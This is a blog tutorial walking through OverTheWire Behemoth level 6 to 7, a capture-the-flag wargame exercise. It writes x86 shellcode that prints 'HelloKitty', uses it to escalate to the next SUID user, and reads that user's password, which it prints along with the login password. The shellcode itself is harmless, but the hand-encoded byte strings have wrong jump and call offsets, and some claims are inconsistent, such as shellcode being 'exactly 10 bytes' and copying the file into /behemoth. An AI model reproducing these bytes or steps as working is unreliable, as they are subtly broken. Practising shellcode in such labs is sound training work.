---
date: 2023-09-04 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Behemoth Level 6 → 7 tutorial!!"
permalink: /posts/overTheWire-Behemoth-Level-6-to-7/
tags: [overthewire, behemoth, exploitation, shellcode, linux-syscall, x86, walkthrough, ctf, linux, beginner]
description: "A step by step tutorial for OverTheWire Behemoth Level 6 → 7!!"
---

<!-- Scoped styles: only affect this post -->

<style>
  .behemoth-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .behemoth-nav .nav-left,.behemoth-nav .nav-center,.behemoth-nav .nav-right{flex:1}
  .behemoth-nav .nav-left{text-align:left}
  .behemoth-nav .nav-center{text-align:center}
  .behemoth-nav .nav-right{text-align:right}
  .behemoth-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .behemoth-nav a:hover{transform:translateY(-1px)}
  .behemoth-nav .disabled{opacity:.55}
  :root[data-theme='light'] .behemoth-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="behemoth-nav" aria-label="Behemoth level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Behemoth-Level-5-to-6/' | relative_url }}">← Previous: Level 5 → 6</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/behemoth/behemoth7.html" target="_blank" rel="noopener">
      Official (Level 7) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Behemoth-Level-7-to-8/' | relative_url }}">Next: Level 7 → 8 →</a>
  </div>
</nav>

## Login

Log in as **behemoth6** using the password you obtained from Level 5 → 6.

```bash
ssh behemoth6@behemoth.labs.overthewire.org -p 2221
# password: mayiroeche
```

---

## Task

You’ll find two binaries in `/behemoth/`:

* `behemoth6` — the challenge
* `behemoth6_reader` — a helper the challenge runs

`behemoth6` reads **raw bytes** from a file named **`shellcode.txt`**, asks the reader to execute them, and expects its **output to equal the exact string `HelloKitty`**. If it matches, you’re promoted to **behemoth7**.

Your job: write **position-independent 32-bit shellcode** that prints `HelloKitty` to **stdout**, save the raw bytes to `shellcode.txt`, then run the challenge.

---

## A little bit of Theory

* **Shellcode** is tiny machine code—here x86 (32-bit)—that must be:

  * **Position-independent** (no absolute addresses).
  * **Null-free** ideally (not strictly required here).
* On **Linux x86**, system calls use `int 0x80`. For this level we need:

  * `sys_write` → `eax=4`, `ebx=1` (stdout), `ecx=buf`, `edx=len`.
  * `sys_exit`  → `eax=1`, `ebx=0`.
* A common trick to get a data pointer without absolute addresses:

  * `jmp short string` → `call code` → `pop ecx` (now `ecx` points to the string).

**We’ll output exactly 10 bytes:** `HelloKitty`

**Further reading:**

* Linux x86 syscall table (int `0x80`)
* Position-independent shellcode patterns (`jmp/call/pop`)
* NASM & ndisasm basics for writing and inspecting raw shellcode

---

## Solution

### 1) Recon (why we need shellcode that prints)

```bash
cd /behemoth
./behemoth6
# Incorrect output.

ltrace ./behemoth6
# popen("/behemoth/behemoth6_reader","r") ...
# fread(..., 10, 1, ...)              # reads 10 bytes from shellcode.txt
# strcmp("...reader output...", "HelloKitty")  # compares to target
# -> "Incorrect output."
```

So `behemoth6_reader` loads and runs **exactly 10 bytes** of shellcode from `shellcode.txt` and pipes **its output** back to `behemoth6`, which then compares to `"HelloKitty"`.

> Therefore our shellcode must *print* `HelloKitty` (10 bytes, no newline) to **stdout** and then exit cleanly.

---

### 2) Write minimal x86 (32-bit) shellcode

Create an assembly file:

```bash
mkdir -p /tmp/barfoo && cd /tmp/barfoo
cat > HelloKitty.asm <<'ASM'
BITS 32

; jmp/call/pop to get EIP-relative pointer to the string
jmp short string

code:
  pop ecx            ; ECX -> "HelloKitty"
  xor eax, eax
  mov al, 4          ; sys_write
  xor ebx, ebx
  inc ebx            ; ebx = 1 (stdout)
  xor edx, edx
  mov dl, 10         ; length("HelloKitty") = 10
  int 0x80           ; write(1, "HelloKitty", 10)

  mov al, 1          ; sys_exit
  dec ebx            ; ebx = 0
  int 0x80

string:
  call code
  db "HelloKitty"
ASM
```

Quick sanity check (optional):

```bash
nasm -f elf32 -o hk.o HelloKitty.asm && ndisasm -b32 HelloKitty.asm >/dev/null
# Or just disassemble assembled code:
nasm -f bin -o hk.bin HelloKitty.asm
ndisasm -b32 hk.bin | head
```

---

### 3) Produce **raw bytes** as `shellcode.txt`

You need raw machine bytes in the file *exactly as read*—no ELF headers, no ASCII. Two easy ways:

**Method A (recommended): assemble flat binary directly**

```bash
# Flat binary (no headers) straight into the file the program expects
nasm -f bin HelloKitty.asm -o shellcode.txt
chmod 777 shellcode.txt
```

**Method B (alternative): write bytes with Python**
If you prefer to paste bytes, you can extract them with `ndisasm` or grab a known-good blob. One classic encoding of the code above is:

```bash
python3 - <<'PY'
import sys
# jmp/call/pop + sys_write("HelloKitty",10) + sys_exit(0)
payload = (
    b"\xeb\x19"              # jmp short +0x19
    b"\x59"                  # pop ecx
    b"\x31\xc0"              # xor eax,eax
    b"\xb0\x04"              # mov al,4        (sys_write)
    b"\x31\xdb"              # xor ebx,ebx
    b"\x43"                  # inc ebx         (stdout)
    b"\x31\xd2"              # xor edx,edx
    b"\xb2\x0a"              # mov dl,10       (len)
    b"\xcd\x80"              # int 0x80        (write)
    b"\xb0\x01"              # mov al,1        (sys_exit)
    b"\x4b"                  # dec ebx         (status=0)
    b"\xcd\x80"              # int 0x80        (exit)
    b"\xe8\xe2\xff\xff\xff"  # call code (back 0x1d to 'pop ecx')
    b"HelloKitty"            # the string (10 bytes)
)
open("shellcode.txt","wb").write(payload)
print("Wrote", len(payload), "bytes to shellcode.txt")
PY
chmod 777 shellcode.txt
```

> Either method yields a **raw** `shellcode.txt` whose first bytes are executable machine code.

---

### 4) Run the challenge

```bash
cd /behemoth
./behemoth6
# Correct.
# (SUID switches you)
whoami
# behemoth7
cat /etc/behemoth_pass/behemoth7
# baquxouaf
```

---

## Password

> This is the password from my run; if yours differs, use the one your terminal printed.

```
baquxouaf
```

---

## Troubleshooting

* **“Incorrect output.”**
  Your shellcode didn’t print *exactly* `HelloKitty` (10 bytes, no newline). Ensure `edx=10` and you didn’t append `\n`.
* **`behemoth6_reader: Couldn't open shellcode.txt`**
  Create the file in the directory where `behemoth6` expects (your **current working directory**). Name must be **`shellcode.txt`** and be **readable**.
* **No change in user / still `behemoth6`**
  The program prints “Correct.” only when output matches; otherwise no SUID effect. Re-check the bytes in `shellcode.txt`.
* **Assembling with the wrong format**
  Use **flat binary** (`-f bin`) if assembling with NASM straight to the file. If you produce an ELF (`-f elf32`), that won’t work—`behemoth6_reader` expects raw bytes, not an executable.
* **Accidentally wrote ASCII**
  Don’t `echo` hex strings. Either assemble with NASM to a **binary** or write bytes with Python opened in **binary** mode.

---

## Copy-paste quick run (one shot)

```bash
# 0) Login
ssh behemoth6@behemoth.labs.overthewire.org -p 2221
# password: mayiroeche

# 1) Make shellcode file (Python method)
cd /tmp && mkdir -p barfoo && cd barfoo
python3 - <<'PY'
import sys
payload = (
    b"\xeb\x19\x59\x31\xc0\xb0\x04\x31\xdb\x43\x31\xd2\xb2\x0a\xcd\x80"
    b"\xb0\x01\x4b\xcd\x80\xe8\xe2\xff\xff\xffHelloKitty"
)
open("shellcode.txt","wb").write(payload)
PY
chmod 777 shellcode.txt

# 2) Run challenge
cd /behemoth
cp /tmp/barfoo/shellcode.txt .
./behemoth6
whoami
cat /etc/behemoth_pass/behemoth7
```

---

**Congrats 🎉** You wrote and delivered **position-independent x86 shellcode** that prints an exact string, passed the check, and escalated to **behemoth7**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
